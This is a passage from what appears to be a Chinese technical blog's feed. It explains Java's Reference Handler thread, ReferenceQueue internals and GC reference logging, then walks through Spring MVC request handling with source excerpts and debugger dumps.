class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Try handle pending &#123;<span class="doctag">@link</span> Reference&#125; if there is one.&lt;p&gt;</span></span><br><span class="line"><span class="comment">     * Return &#123;<span class="doctag">@code</span> true&#125; as a hint that there might be another</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Reference&#125; pending or &#123;<span class="doctag">@code</span> false&#125; when there are no more pending</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Reference&#125;s at the moment and the program can do some other</span></span><br><span class="line"><span class="comment">     * useful work instead of looping.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> waitForNotify if &#123;<span class="doctag">@code</span> true&#125; and there was no pending</span></span><br><span class="line"><span class="comment">     *                      &#123;<span class="doctag">@link</span> Reference&#125;, wait until notified from VM</span></span><br><span class="line"><span class="comment">     *                      or interrupted; if &#123;<span class="doctag">@code</span> false&#125;, return immediately</span></span><br><span class="line"><span class="comment">     *                      when there is no pending &#123;<span class="doctag">@link</span> Reference&#125;.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if there was a &#123;<span class="doctag">@link</span> Reference&#125; pending and it</span></span><br><span class="line"><span class="comment">     *         was processed, or we waited for notification and either got it</span></span><br><span class="line"><span class="comment">     *         or thread was interrupted before being notified;</span></span><br><span class="line"><span class="comment">     *         &#123;<span class="doctag">@code</span> false&#125; otherwise.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">tryHandlePending</span><span class="params">(<span class="keyword">boolean</span> waitForNotify)</span> </span>&#123;</span><br><span class="line">        Reference&lt;Object&gt; r;</span><br><span class="line">        Cleaner c;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">                <span class="comment">// pending list不为null, 说明有需要处理的引用</span></span><br><span class="line">                <span class="keyword">if</span> (pending != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    r = pending;</span><br><span class="line">                    <span class="comment">// 'instanceof' might throw OutOfMemoryError sometimes</span></span><br><span class="line">                    <span class="comment">// so do this before un-linking 'r' from the 'pending' chain...</span></span><br><span class="line">                    c = r <span class="keyword">instanceof</span> Cleaner ? (Cleaner) r : <span class="keyword">null</span>;</span><br><span class="line">                    <span class="comment">// unlink 'r' from 'pending' chain</span></span><br><span class="line">                    <span class="comment">// 从pending list中删除r</span></span><br><span class="line">                    pending = r.discovered;</span><br><span class="line">                    r.discovered = <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// The waiting on the lock may cause an OutOfMemoryError</span></span><br><span class="line">                    <span class="comment">// because it may try to allocate exception objects.</span></span><br><span class="line">                    <span class="keyword">if</span> (waitForNotify) &#123;</span><br><span class="line">                        <span class="comment">// 没有需要处理的引用, 就wait, 这个应该会被JVM给notify</span></span><br><span class="line">                        lock.wait();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// retry if waited</span></span><br><span class="line">                    <span class="keyword">return</span> waitForNotify;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (OutOfMemoryError x) &#123;</span><br><span class="line">            <span class="comment">// Give other threads CPU time so they hopefully drop some live references</span></span><br><span class="line">            <span class="comment">// and GC reclaims some space.</span></span><br><span class="line">            <span class="comment">// Also prevent CPU intensive spinning in case 'r instanceof Cleaner' above</span></span><br><span class="line">            <span class="comment">// persistently throws OOME for some time...</span></span><br><span class="line">            Thread.yield();</span><br><span class="line">            <span class="comment">// retry</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException x) &#123;</span><br><span class="line">            <span class="comment">// retry</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fast path for cleaners</span></span><br><span class="line">        <span class="keyword">if</span> (c != <span class="keyword">null</span>) &#123;</span><br><span class="line">            c.clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ReferenceQueue&lt;? <span class="keyword">super</span> Object&gt; q = r.queue;</span><br><span class="line">        <span class="comment">// 如果关联了ReferenceQueue, 就加入到ReferenceQueue中</span></span><br><span class="line">        <span class="keyword">if</span> (q != ReferenceQueue.NULL) q.enqueue(r);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="ReferenceQueue"><a href="#ReferenceQueue" class="headerlink" title="ReferenceQueue"></a>ReferenceQueue</h2><p><code>ReferenceQueue</code>用一个链表来维护队列里的<code>Reference</code></p><p>入队列相关的操作:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(Reference&lt;? extends T&gt; r)</span> </span>&#123; <span class="comment">/* Called only by Reference class */</span></span><br><span class="line">       <span class="keyword">synchronized</span> (lock) &#123; <span class="comment">// 和队列相关的锁</span></span><br><span class="line">           <span class="comment">// Check that since getting the lock this reference hasn't already been</span></span><br><span class="line">           <span class="comment">// enqueued (and even then removed)</span></span><br><span class="line">           <span class="comment">// 校验下r带的队列是自己, 并且已经enqueue的不会重复enqueue</span></span><br><span class="line">           ReferenceQueue&lt;?&gt; queue = r.queue;</span><br><span class="line">           <span class="keyword">if</span> ((queue == NULL) || (queue == ENQUEUED)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">assert</span> queue == <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 修改Reference的queue为ENQUEUED, 代表已经入队了</span></span><br><span class="line">           r.queue = ENQUEUED;</span><br><span class="line">           <span class="comment">// 链表的头插发, 将当前的引用入队, 并更新head的值和队列的长度</span></span><br><span class="line">           r.next = (head == <span class="keyword">null</span>) ? r : head;</span><br><span class="line">           head = r;</span><br><span class="line">           queueLength++;</span><br><span class="line">           <span class="keyword">if</span> (r <span class="keyword">instanceof</span> FinalReference) &#123;</span><br><span class="line">               sun.misc.VM.addFinalRefCount(<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           lock.notifyAll();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>出队列相关的操作:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">   <span class="keyword">private</span> Reference&lt;? extends T&gt; reallyPoll() &#123;       <span class="comment">/* Must hold lock */</span></span><br><span class="line">       Reference&lt;? extends T&gt; r = head;</span><br><span class="line">       <span class="keyword">if</span> (r != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="comment">// 因为这个队列的尾节点的next总是指向自己, 这里判断如果是尾节点出队列, head置为null</span></span><br><span class="line">           head = (r.next == r) ?</span><br><span class="line">               <span class="keyword">null</span> :</span><br><span class="line">               r.next; <span class="comment">// Unchecked due to the next field having a raw type in Reference</span></span><br><span class="line">           <span class="comment">// 修改对应queue的状态, 代表已经出队列</span></span><br><span class="line">           r.queue = NULL;</span><br><span class="line">           <span class="comment">// 对于出队列的引用, 他的next也是指向自己的</span></span><br><span class="line">           r.next = r;</span><br><span class="line">           queueLength--;</span><br><span class="line">           <span class="keyword">if</span> (r <span class="keyword">instanceof</span> FinalReference) &#123;</span><br><span class="line">               sun.misc.VM.addFinalRefCount(-<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="openjdk"><a href="#openjdk" class="headerlink" title="openjdk"></a>openjdk</h2><blockquote><p>上面两个变量对应在VM中的调用，可以参考openjdk中的hotspot源码，在hotspot/src/share/vm/memory/referenceProcessor.cpp 的ReferenceProcessor::discover_reference 方法。(根据此方法的注释由了解到虚拟机在对Reference的处理有ReferenceBasedDiscovery和RefeferentBasedDiscovery两种策略)</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReferenceProcessor::enqueue_discovered_reflist</span><span class="params">(DiscoveredList&amp; refs_list,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                    HeapWord* pending_list_addr)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Given a list of refs linked through the "discovered" field</span></span><br><span class="line">  <span class="comment">// (java.lang.ref.Reference.discovered), self-loop their "next" field</span></span><br><span class="line">  <span class="comment">// thus distinguishing them from active References, then</span></span><br><span class="line">  <span class="comment">// prepend them to the pending list.</span></span><br><span class="line">  <span class="comment">// BKWRD COMPATIBILITY <span class="doctag">NOTE:</span> For older JDKs (prior to the fix for 4956777),</span></span><br><span class="line">  <span class="comment">// the "next" field is used to chain the pending list, not the discovered</span></span><br><span class="line">  <span class="comment">// field.</span></span><br><span class="line">  ...</span><br><span class="line">                                                    &#125;</span><br></pre></td></tr></table></figure><h2 id="GC日志"><a href="#GC日志" class="headerlink" title="GC日志"></a>GC日志</h2><p>在jvm的启动参数中加入下面的flag, 可以打开处理引用用掉的时间:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+PrintGCDetails -XX:+PrintReferenceGC</span><br></pre></td></tr></table></figure><p>测试代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testGc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Object reference = <span class="keyword">new</span> Object();</span><br><span class="line">       <span class="keyword">final</span> WeakReference&lt;Object&gt; weakReference = <span class="keyword">new</span> WeakReference&lt;&gt;(reference);</span><br><span class="line"></span><br><span class="line">       Assert.assertEquals(reference, weakReference.get());</span><br><span class="line"></span><br><span class="line">       reference = <span class="keyword">null</span>;</span><br><span class="line">       System.gc();</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 当所引用的对象在 JVM 内不再有强引用时, GC 后 weak reference 将会被自动回收</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       Assert.assertNull(weakReference.get());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>日志输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[GC (System.gc()) [SoftReference, 0 refs, 0.0000616 secs][WeakReference, 34 refs, 0.0000273 secs][FinalReference, 654 refs, 0.0003785 secs][PhantomReference, 0 refs, 0 refs, 0.0000060 secs][JNI Weak Reference, 0.0000023 secs][PSYoungGen: 10708K-&gt;1566K(56320K)] 10708K-&gt;1574K(184832K), 0.0083391 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] </span><br><span class="line">[Full GC (System.gc()) [SoftReference, 0 refs, 0.0000153 secs][WeakReference, 1 refs, 0.0000035 secs][FinalReference, 85 refs, 0.0000111 secs][PhantomReference, 0 refs, 0 refs, 0.0000037 secs][JNI Weak Reference, 0.0000020 secs][PSYoungGen: 1566K-&gt;0K(56320K)] [ParOldGen: 8K-&gt;1438K(128512K)] 1574K-&gt;1438K(184832K), [Metaspace: 4770K-&gt;4770K(1056768K)], 0.0319906 secs] [Times: user=0.03 sys=0.00, real=0.04 secs] </span><br><span class="line">Heap</span><br><span class="line"> PSYoungGen      total 56320K, used 972K [0x0000000781e00000, 0x0000000785c80000, 0x00000007c0000000)</span><br><span class="line">  eden space 48640K, 2% used [0x0000000781e00000,0x0000000781ef3358,0x0000000784d80000)</span><br><span class="line">  from space 7680K, 0% used [0x0000000784d80000,0x0000000784d80000,0x0000000785500000)</span><br><span class="line">  to   space 7680K, 0% used [0x0000000785500000,0x0000000785500000,0x0000000785c80000)</span><br><span class="line"> ParOldGen       total 128512K, used 1438K [0x0000000705a00000, 0x000000070d780000, 0x0000000781e00000)</span><br><span class="line">  object space 128512K, 1% used [0x0000000705a00000,0x0000000705b679e0,0x000000070d780000)</span><br><span class="line"> Metaspace       used 4784K, capacity 5158K, committed 5248K, reserved 1056768K</span><br><span class="line">  class space    used 564K, capacity 593K, committed 640K, reserved 1048576K</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://hongjiang.info/java-referencequeue/#comment-4504" rel="external nofollow noopener noreferrer" target="_blank">话说ReferenceQueue | 写点什么</a></li><li><a href="https://cordate.github.io/2018/03/06/java/SharedSecrets%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/" rel="external nofollow noopener noreferrer" target="_blank">SharedSecrets深入理解 | 柳絮纷飞</a></li><li><a href="http://www.iteye.com/topic/401478" rel="external nofollow noopener noreferrer" target="_blank">理解 Java 的 GC 与 幽灵引用 - Java - ITeye论坛</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;jvm中的Reference-Handler线程&quot;&gt;&lt;a href=&quot;#jvm中的Reference-Handler线程&quot; class=&quot;headerlink&quot; title=&quot;jvm中的Reference Handler线程&quot;&gt;&lt;/a&gt;jvm中的&lt;code&gt;Ref
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="reference" scheme="http://qsli.github.io/tags/reference/"/>
    
  </entry>
  
  <entry>
    <title>Spring Mvc源码剖析(二)</title>
    <link href="http://qsli.github.io/2018/05/06/spring-mvc-2/"/>
    <id>http://qsli.github.io/2018/05/06/spring-mvc-2/</id>
    <published>2018-05-06T09:16:48.000Z</published>
    <updated>2018-08-11T12:42:42.674Z</updated>
    
    <content type="html"><![CDATA[<p>启动流程的分析见: <a href="/2016/10/02/spring-mvc/" title="Spring Mvc源码剖析(一)">Spring Mvc源码剖析(一)</a></p><img src="/2018/05/06/spring-mvc-2/spring-mvc.png"><h2 id="源码版本"><a href="#源码版本" class="headerlink" title="源码版本"></a>源码版本</h2><blockquote><p>4.3.6.RELEASE</p></blockquote><h2 id="HandlerExecutionChain"><a href="#HandlerExecutionChain" class="headerlink" title="HandlerExecutionChain"></a>HandlerExecutionChain</h2><p><em>request -&gt; executionchain</em></p><p>// RequestMappingHandlerMapping<br>遍历已有的<code>HandlerMapping</code>, 找到第一个能处理的<code>HandlerMapping</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerExecutionChain <span class="title">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (HandlerMapping hm : <span class="keyword">this</span>.handlerMappings) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">logger.trace(</span><br><span class="line"><span class="string">"Testing handler map ["</span> + hm + <span class="string">"] in DispatcherServlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">HandlerExecutionChain handler = hm.getHandler(request);</span><br><span class="line"><span class="keyword">if</span> (handler != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handlerMappings的值默认是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">this.handlerMappings = &#123;ArrayList@5980&#125;  size = 2</span><br><span class="line"> 0 = &#123;RequestMappingHandlerMapping@5997&#125; </span><br><span class="line"> 1 = &#123;BeanNameUrlHandlerMapping@6002&#125;</span><br></pre></td></tr></table></figure><p>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</p><p>executionchain就是interceptor和实际处理方法的结合体</p><h3 id="映射关系"><a href="#映射关系" class="headerlink" title="映射关系"></a>映射关系</h3><p><em>url -&gt; HandlerMethod</em></p><p>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal</p><p><code>HandlerMethod</code>是具体的controller对应的方法.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mappingLookup = &#123;LinkedHashMap@6069&#125;  size = 4</span><br><span class="line"> 0 = &#123;LinkedHashMap$Entry@6077&#125; &quot;&#123;[/async]&#125;&quot; -&gt; &quot;public java.util.concurrent.Callable&lt;java.lang.String&gt; com.air.mvc.AsyncController.asyncProcess()&quot;</span><br><span class="line"> 1 = &#123;LinkedHashMap$Entry@6078&#125; &quot;&#123;[/asyncV2]&#125;&quot; -&gt; &quot;public org.springframework.web.context.request.async.DeferredResult&lt;java.lang.String&gt; com.air.mvc.AsyncController.aysncProcess2()&quot;</span><br><span class="line"> 2 = &#123;LinkedHashMap$Entry@6079&#125; &quot;&#123;[/mvc/echo]&#125;&quot; -&gt; &quot;private java.lang.String com.air.mvc.SampleController.echo(javax.servlet.http.HttpServletRequest)&quot;</span><br><span class="line"> 3 = &#123;LinkedHashMap$Entry@6080&#125; &quot;&#123;[/mvc/test]&#125;&quot; -&gt; &quot;private java.lang.String com.air.mvc.SampleController.echo(java.lang.String)&quot;</span><br></pre></td></tr></table></figure><h3 id="interceptor"><a href="#interceptor" class="headerlink" title="interceptor"></a>interceptor</h3><p><em>url -&gt; interceptors</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  /mvc/test</span></span><br><span class="line">String lookupPath = <span class="keyword">this</span>.urlPathHelper.getLookupPathForRequest(request);</span><br><span class="line"><span class="keyword">for</span> (HandlerInterceptor interceptor : <span class="keyword">this</span>.adaptedInterceptors) &#123;</span><br><span class="line"><span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor) &#123;</span><br><span class="line">MappedInterceptor mappedInterceptor = (MappedInterceptor) interceptor;</span><br><span class="line"><span class="keyword">if</span> (mappedInterceptor.matches(lookupPath, <span class="keyword">this</span>.pathMatcher)) &#123;</span><br><span class="line">chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">chain.addInterceptor(interceptor);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HandlerAdapter"><a href="#HandlerAdapter" class="headerlink" title="HandlerAdapter"></a>HandlerAdapter</h2><p><em>HandlerMethod -&gt; HandlerAdapter</em></p><p>// RequestMappingHandlerAdapter<br>org.springframework.web.servlet.DispatcherServlet#getHandlerAdapter</p><p>遍历所有的<code>HandlerAdapters</code>, 找到第一个能处理的<code>HandlerAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerAdapter <span class="title">getHandlerAdapter</span><span class="params">(Object handler)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (HandlerAdapter ha : <span class="keyword">this</span>.handlerAdapters) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">logger.trace(<span class="string">"Testing handler adapter ["</span> + ha + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ha.supports(handler)) &#123;</span><br><span class="line"><span class="keyword">return</span> ha;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"No adapter for handler ["</span> + handler +</span><br><span class="line"><span class="string">"]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认的<code>HandlerAdapters</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.handlerAdapters = &#123;ArrayList@5983&#125;  size = 3</span><br><span class="line"> 0 = &#123;RequestMappingHandlerAdapter@4845&#125; </span><br><span class="line"> 1 = &#123;HttpRequestHandlerAdapter@6268&#125; </span><br><span class="line"> 2 = &#123;SimpleControllerHandlerAdapter@6269&#125;</span><br></pre></td></tr></table></figure><p>涉及到的请求处理:</p><pre><code>a. org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod    调用对应的controller方法b. org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView    返回模型和视图</code></pre><h2 id="ServletInvocableHandlerMethod"><a href="#ServletInvocableHandlerMethod" class="headerlink" title="ServletInvocableHandlerMethod"></a>ServletInvocableHandlerMethod</h2><p><em>HandlerMethod -&gt; ServletInvocableHandlerMethod</em></p><p>org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle</p><p>   a. InvocableHandlerMethod#invokeForRequest</p><pre><code>    1. 解析传递的参数, 必要时进行转换(resolver负责映射输入的参数名称和controller方法对应的参数, dataBinder负责类型转换和校验)    2. 反射调用对应的方法b. returnValueHandlers#handleReturnValue    从所有的handler中找到第一个支持对应返回值类型的处理返回值, 可能涉及`HttpMessageConverter`</code></pre><h3 id="argumentResolvers"><a href="#argumentResolvers" class="headerlink" title="argumentResolvers"></a>argumentResolvers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">this.argumentResolvers = &#123;HandlerMethodArgumentResolverComposite@4853&#125; </span><br><span class="line"> logger = &#123;SLF4JLocationAwareLog@6533&#125; </span><br><span class="line"> argumentResolvers = &#123;LinkedList@6534&#125;  size = 26</span><br><span class="line">  0 = &#123;RequestParamMethodArgumentResolver@5292&#125; </span><br><span class="line">  1 = &#123;RequestParamMapMethodArgumentResolver@6541&#125; </span><br><span class="line">  2 = &#123;PathVariableMethodArgumentResolver@6542&#125; </span><br><span class="line">  3 = &#123;PathVariableMapMethodArgumentResolver@6543&#125; </span><br><span class="line">  4 = &#123;MatrixVariableMethodArgumentResolver@6544&#125; </span><br><span class="line">  5 = &#123;MatrixVariableMapMethodArgumentResolver@6545&#125; </span><br><span class="line">  6 = &#123;ServletModelAttributeMethodProcessor@6546&#125; </span><br><span class="line">  7 = &#123;RequestResponseBodyMethodProcessor@6547&#125; </span><br><span class="line">  8 = &#123;RequestPartMethodArgumentResolver@6548&#125; </span><br><span class="line">  9 = &#123;RequestHeaderMethodArgumentResolver@6549&#125; </span><br><span class="line">  10 = &#123;RequestHeaderMapMethodArgumentResolver@6550&#125; </span><br><span class="line">  11 = &#123;ServletCookieValueMethodArgumentResolver@6551&#125; </span><br><span class="line">  12 = &#123;ExpressionValueMethodArgumentResolver@6552&#125; </span><br><span class="line">  13 = &#123;SessionAttributeMethodArgumentResolver@6553&#125; </span><br><span class="line">  14 = &#123;RequestAttributeMethodArgumentResolver@6554&#125; </span><br><span class="line">  15 = &#123;ServletRequestMethodArgumentResolver@6555&#125; </span><br><span class="line">  16 = &#123;ServletResponseMethodArgumentResolver@6556&#125; </span><br><span class="line">  17 = &#123;HttpEntityMethodProcessor@6557&#125; </span><br><span class="line">  18 = &#123;RedirectAttributesMethodArgumentResolver@6558&#125; </span><br><span class="line">  19 = &#123;ModelMethodProcessor@6559&#125; </span><br><span class="line">  20 = &#123;MapMethodProcessor@6560&#125; </span><br><span class="line">  21 = &#123;ErrorsMethodArgumentResolver@6561&#125; </span><br><span class="line">  22 = &#123;SessionStatusMethodArgumentResolver@6562&#125; </span><br><span class="line">  23 = &#123;UriComponentsBuilderMethodArgumentResolver@6563&#125; </span><br><span class="line">  24 = &#123;RequestParamMethodArgumentResolver@6564&#125; </span><br><span class="line">  25 = &#123;ServletModelAttributeMethodProcessor@6565&#125; </span><br><span class="line"> argumentResolverCache = &#123;ConcurrentHashMap@6535&#125;  size = 1</span><br><span class="line">  0 = &#123;ConcurrentHashMap$MapEntry@6538&#125; &quot;method &apos;echo&apos; parameter 0&quot; -&gt; </span><br><span class="line">   key = &#123;HandlerMethod$HandlerMethodParameter@5293&#125; &quot;method &apos;echo&apos; parameter 0&quot;</span><br><span class="line">   value = &#123;RequestParamMethodArgumentResolver@5292&#125;</span><br></pre></td></tr></table></figure><h3 id="returnValueHandlers"><a href="#returnValueHandlers" class="headerlink" title="returnValueHandlers"></a>returnValueHandlers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">this.returnValueHandlers = &#123;HandlerMethodReturnValueHandlerComposite@4855&#125; </span><br><span class="line"> logger = &#123;SLF4JLocationAwareLog@6567&#125; </span><br><span class="line"> returnValueHandlers = &#123;ArrayList@6568&#125;  size = 15</span><br><span class="line">  0 = 